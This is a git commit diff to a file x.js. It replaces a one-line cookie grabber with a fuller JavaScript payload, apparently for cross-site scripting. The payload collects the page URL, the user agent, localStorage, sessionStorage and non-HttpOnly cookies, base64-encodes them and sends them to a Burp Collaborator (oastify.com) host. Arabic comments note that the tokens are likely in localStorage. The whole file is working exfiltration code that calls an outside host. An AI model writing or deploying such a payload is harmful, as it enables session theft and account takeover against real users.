f4e01423d40260e02b11065b72295232197ec104
yassir0101 <140100889+yassir0101@users.noreply.github.com>
2026-02-06 19:05:23 +0100

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,12 @@
-fetch("https://ophsgs9rsez0zbeyj44garp8azgq4hs6.oastify.com/?c=" + btoa(document.cookie));
+(async function() {
+    let data = {
+        url: window.location.href,
+        userAgent: navigator.userAgent,
+        localStorage: JSON.stringify(localStorage), // هادي غالبا فيها الـ Tokens
+        sessionStorage: JSON.stringify(sessionStorage),
+        cookie: document.cookie // غايجيب غير اللي ماشي HttpOnly
+    };
+
+    // إرسال الداتا كاملة مشفرة لـ Collaborator
+    fetch("https://xkl1b140nnu9uk97edzp50kh58bzzrng.oastify.com/?leak=" + btoa(unescape(encodeURIComponent(JSON.stringify(data)))));
+})();
